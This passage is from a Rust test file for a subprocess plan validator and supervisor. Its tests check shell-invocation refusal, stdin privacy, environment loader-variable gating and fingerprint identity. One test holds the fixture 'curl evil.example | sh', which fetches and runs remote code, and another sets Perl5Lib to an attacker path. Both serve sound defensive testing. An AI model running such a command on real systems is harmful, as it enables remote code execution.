    assert_eq!(handle.close_stdin(), StdinWriteOutcome::NotStreamed);
    assert!(!StdinWriteOutcome::NotStreamed.is_accepted());
    let _ = handle.wait();
    assert!(supervisor.stdin_written().is_empty());
    Ok(())
}

#[test]
fn stdin_writes_after_settlement_are_refused() -> TestResult {
    let supervisor = FakeSupervisor::new();
    supervisor.script_run(ScriptedRun::exiting(0));
    let validated = valid_interactive_session().validate()?;
    let mut handle = match supervisor.start(validated) {
        Ok(handle) => handle,
        Err(result) => return Err(format!("start refused: {:?}", result.disposition()).into()),
    };
    while handle.next_event().is_some() {}
    assert_eq!(handle.write_stdin(b"too late"), StdinWriteOutcome::RunSettled);
    Ok(())
}

#[test]
fn an_observed_cleanup_failure_is_not_reported_as_never_observed() -> TestResult {
    // The wrong implementation this kills: folding "we checked and cleanup
    // failed" into the same limitation as "we never checked". A consumer
    // reading only the limitations would see unknown confidence for a case the
    // supervisor knows went wrong.
    let failed = result_with(
        StreamEvidence::empty(StreamChannel::Stdout),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::CleanupFailed,
        CleanupDisposition::Failed,
        TreeDisposition::GroupTerminated,
    )?;
    assert!(failed.limitations().contains(&Limitation::CleanupFailed));
    assert!(!failed.limitations().contains(&Limitation::CleanupNotObserved));
    assert!(!failed.claims_tree_cleanup());

    let unobserved = result_with(
        StreamEvidence::empty(StreamChannel::Stdout),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::TimedOut,
        CleanupDisposition::NotObserved,
        TreeDisposition::GroupTerminated,
    )?;
    assert!(unobserved.limitations().contains(&Limitation::CleanupNotObserved));
    assert!(!unobserved.limitations().contains(&Limitation::CleanupFailed));
    Ok(())
}

#[test]
fn a_long_form_inline_command_is_still_a_shell_invocation() -> TestResult {
    for argument in ["--command", "--command=perl script.pl | tee out"] {
        let plan = ProcessPlan::builder(
            PlanId::new("plan-1"),
            OperationId::new("run-file"),
            OwnerDomain::RunFile,
            ExecutionProfile::LinuxOneShot,
            ExecutableIdentity::resolved(
                "pwsh",
                PrivatePath::new(PathBuf::from("/usr/bin/pwsh")),
                ResolutionProvenance::ConfiguredAbsolutePath,
            ),
            allow_listed_environment(),
        )
        .argv([argument])
        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
        .subject(current_root())
        .authorization(user_authorization())
        .claim_boundary(ClaimBoundary::linux_only())
        .build();
        assert!(
            matches!(rejection_of(plan)?, PlanRejection::ShellInvocationRejected { .. }),
            "{argument} was not refused"
        );
    }
    Ok(())
}

#[test]
fn stdin_content_identifies_a_plan_while_its_bytes_stay_out_of_the_encoding() -> TestResult {
    // `PrivateBytes` sits in the fingerprinted privacy tier alongside
    // `PrivatePath`, not the excluded tier that `SecretValue` occupies. Pin
    // both halves of that: the raw bytes never appear, and the content still
    // distinguishes two plans.
    let with_stdin = |source: &[u8]| {
        ProcessPlan::builder(
            PlanId::new("plan-1"),
            OperationId::new("compile-check"),
            OwnerDomain::CompileService,
            ExecutionProfile::LinuxOneShot,
            resolved_perl(),
            allow_listed_environment(),
        )
        .argv(["-c"])
        .stdin(StdinPolicy::Bytes(PrivateBytes::new(source.to_vec())))
        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
        .subject(current_root())
        .authorization(user_authorization())
        .claim_boundary(ClaimBoundary::linux_only())
        .build()
    };

    let marker = b"my $distinctive_identifier = 1;";
    let plan = with_stdin(marker);
    let bytes = plan.canonical_bytes();
    assert!(
        !bytes.windows(marker.len()).any(|window| window == marker),
        "raw stdin content appeared in the canonical encoding"
    );
    assert!(!format!("{plan:?}").contains("distinctive_identifier"));
    assert_ne!(
        with_stdin(b"print 1;").semantic_fingerprint(),
        with_stdin(b"print 2;").semantic_fingerprint(),
        "differing stdin content must give differing plan identities"
    );
    Ok(())
}

// ────────────────── controls added after external bot review ──────────────────

#[test]
fn a_multibyte_argument_cannot_crash_the_validator() -> TestResult {
    // The wrong implementation this kills: comparing an inline-command prefix
    // with `arg[..prefix.len()]`, which panics when that byte index lands
    // inside a multi-byte character. Arguments are arbitrary caller text, so a
    // plan containing an accented word would terminate the process.
    // The prefix scan only runs for a shell executable, so the fixture must
    // use one; with any other program the rule short-circuits before reaching
    // the argument at all.
    for argument in ["--commandé", "é", "--comman\u{e9}d", "日本語のひきすう", "--comman"]
    {
        let plan = ProcessPlan::builder(
            PlanId::new("plan-1"),
            OperationId::new("run-file"),
            OwnerDomain::RunFile,
            ExecutionProfile::LinuxOneShot,
            ExecutableIdentity::resolved(
                "sh",
                PrivatePath::new(PathBuf::from("/bin/sh")),
                ResolutionProvenance::ConfiguredAbsolutePath,
            ),
            allow_listed_environment(),
        )
        .argv([argument])
        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
        .subject(current_root())
        .authorization(user_authorization())
        .claim_boundary(ClaimBoundary::linux_only())
        .build();
        // Any outcome is acceptable; not returning is not.
        let _ = plan.validate();
    }
    Ok(())
}

#[test]
fn a_shell_renamed_by_its_plan_is_still_a_shell() -> TestResult {
    // The wrong implementation this kills: keying the shell rule on the
    // caller-supplied logical name, so labelling `/bin/sh` as "perl" buys
    // unrestricted shell execution through a validated plan.
    let disguised = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        ExecutableIdentity::resolved(
            "perl",
            PrivatePath::new(PathBuf::from("/bin/sh")),
            ResolutionProvenance::ConfiguredAbsolutePath,
        ),
        allow_listed_environment(),
    )
    .argv(["-c", "curl evil.example | sh"])
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert!(
        matches!(rejection_of(disguised)?, PlanRejection::ShellInvocationRejected { .. }),
        "a shell relabelled as perl was admitted"
    );
    Ok(())
}

#[test]
fn authorization_must_identify_a_decision() -> TestResult {
    // Current, strong evidence that names nothing cannot be verified by any
    // backend, so it is not evidence.
    for reference in ["", "   "] {
        let plan = ProcessPlan::builder(
            PlanId::new("plan-1"),
            OperationId::new("run-file"),
            OwnerDomain::RunFile,
            ExecutionProfile::LinuxOneShot,
            resolved_perl(),
            allow_listed_environment(),
        )
        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
        .subject(current_root())
        .authorization(AuthorizationEvidence::new(
            SchemaVersion::new(1),
            reference,
            EvidenceFreshness::Current,
            AuthorizationStrength::ExplicitUserAction,
        ))
        .claim_boundary(ClaimBoundary::linux_only())
        .build();
        assert_eq!(
            rejection_of(plan)?,
            PlanRejection::InsufficientAuthorizationEvidence,
            "empty authorization reference {reference:?} was admitted"
        );
    }
    Ok(())
}

#[test]
fn submillisecond_policy_differences_change_the_plan_identity() -> TestResult {
    // The wrong implementation this kills: encoding a `Duration` as
    // milliseconds, which collapses every sub-millisecond difference and hands
    // two plans with different timing behavior one identity.
    let with_deadline = |deadline: Duration| {
        ProcessPlan::builder(
            PlanId::new("plan-1"),
            OperationId::new("run-file"),
            OwnerDomain::RunFile,
            ExecutionProfile::LinuxOneShot,
            resolved_perl(),
            allow_listed_environment(),
        )
        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
        .deadline(DeadlinePolicy::Wall(deadline))
        .termination(TerminationPolicy::ProcessTree {
            graceful: Duration::from_nanos(500),
            then_forced: true,
        })
        .cancellation(CancellationPolicy::Cooperative { grace: Duration::from_nanos(500) })
        .subject(current_root())
        .authorization(user_authorization())
        .claim_boundary(ClaimBoundary::linux_only())
        .build()
    };
    assert_ne!(
        with_deadline(Duration::from_nanos(1)).semantic_fingerprint(),
        with_deadline(Duration::from_nanos(2)).semantic_fingerprint()
    );
    assert_ne!(
        with_deadline(Duration::from_micros(500)).semantic_fingerprint(),
        with_deadline(Duration::from_micros(600)).semantic_fingerprint()
    );
    Ok(())
}

#[cfg(unix)]
#[test]
fn distinct_non_utf8_paths_keep_distinct_identities() -> TestResult {
    // The wrong implementation this kills: fingerprinting `to_string_lossy()`,
    // which maps every invalid byte onto U+FFFD, so two different executables
    // share one public identity.
    use std::ffi::OsString;
    use std::os::unix::ffi::OsStringExt;

    let first = PrivatePath::new(PathBuf::from(OsString::from_vec(b"/usr/bin/\xff".to_vec())));
    let second = PrivatePath::new(PathBuf::from(OsString::from_vec(b"/usr/bin/\xfe".to_vec())));
    assert_ne!(
        first.expose().to_string_lossy(),
        "unreachable",
        "guard against the fixture silently becoming valid UTF-8"
    );
    assert_eq!(
        first.expose().to_string_lossy(),
        second.expose().to_string_lossy(),
        "the fixture must be two paths that a lossy conversion collapses"
    );
    assert_ne!(
        first.fingerprint(),
        second.fingerprint(),
        "distinct paths collapsed onto one fingerprint"
    );
    Ok(())
}

#[test]
fn a_removed_loader_variable_is_not_admitted() -> TestResult {
    // Removing a variable is as effective as denying it, and the gate must not
    // demand an acknowledgement for a risk the plan already eliminated.
    let mut projection =
        EnvironmentProjection::new("env:1", AmbientInheritance::InheritExceptDenied);
    for name in CODE_LOADING_VARIABLES {
        projection = projection.remove(EnvVarName::new(*name));
    }
    assert!(projection.admitted_code_loading_variables().is_empty());
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        projection,
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert!(plan.validate().is_ok());
    Ok(())
}

#[test]
fn a_mixed_case_loader_variable_does_not_evade_the_gate() -> TestResult {
    // Environment names are case-sensitive on Unix and not on Windows. The
    // safe reading of that ambiguity is that `Perl5Lib` is the loader variable
    // it resembles.
    let projection = EnvironmentProjection::new("env:1", AmbientInheritance::AllowListedOnly)
        .add(EnvVarName::new("Perl5Lib"), SecretValue::new("/attacker/lib"));
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        projection,
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert!(matches!(rejection_of(plan)?, PlanRejection::UnacknowledgedCodeLoadingVariable { .. }));
    Ok(())
}

#[test]
fn a_result_cannot_carry_swapped_or_incoherent_stream_evidence() -> TestResult {
    // The wrong implementation this kills: assembling a result from whatever
    // evidence a backend hands over, so stdout and stderr can be swapped or
    // evidence can claim a completeness it does not have.
    let swapped = result_with(
        StreamEvidence::complete(StreamChannel::Stderr, b"wrong slot".to_vec()),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::CompletedExit { code: 0 },
        CleanupDisposition::Completed,
        TreeDisposition::GroupTerminated,
    );
    assert!(swapped.is_err(), "a result accepted stderr evidence in the stdout slot");

    let lying = result_with(
        StreamEvidence::new(
            StreamChannel::Stdout,
            10_000,
            perl_subprocess_runtime::process::ContentFingerprint::of(b"observed"),
            b"retained".to_vec(),
            TruncationState::Complete,
        ),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::CompletedExit { code: 0 },
        CleanupDisposition::Completed,
        TreeDisposition::GroupTerminated,
    );
    assert!(lying.is_err(), "a result accepted evidence claiming a completeness it lacks");
    Ok(())
}

#[test]
fn a_completed_exit_cannot_be_paired_with_a_failed_cleanup() -> TestResult {
    // `TerminalDisposition::elect` already ranks cleanup failure above a
    // completed exit. Without this check a backend could bypass election and
    // assemble the contradiction directly, and `is_ordinary_success` would
    // return true for a run whose cleanup failed.
    let contradiction = result_with(
        StreamEvidence::empty(StreamChannel::Stdout),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::CompletedExit { code: 0 },
        CleanupDisposition::Failed,
        TreeDisposition::GroupTerminated,
    );
    assert!(contradiction.is_err(), "a zero exit was admitted alongside a failed cleanup");
    Ok(())
}

#[test]
fn allowing_and_removing_one_variable_is_a_contradiction() -> TestResult {
    // The wrong implementation this kills: checking only allowed-and-denied,
    // so allowed-and-removed slips through with no defined precedence and two
    // backends can project different child environments from one validated
    // plan.
    let projection = EnvironmentProjection::new("env:1", AmbientInheritance::AllowListedOnly)
        .allow(EnvVarName::new("PATH"))
        .remove(EnvVarName::new("PATH"));
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        projection,
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(
        rejection_of(plan)?,
        PlanRejection::ContradictoryEnvironmentRules { variable: "PATH".to_string() }
    );
    Ok(())
}
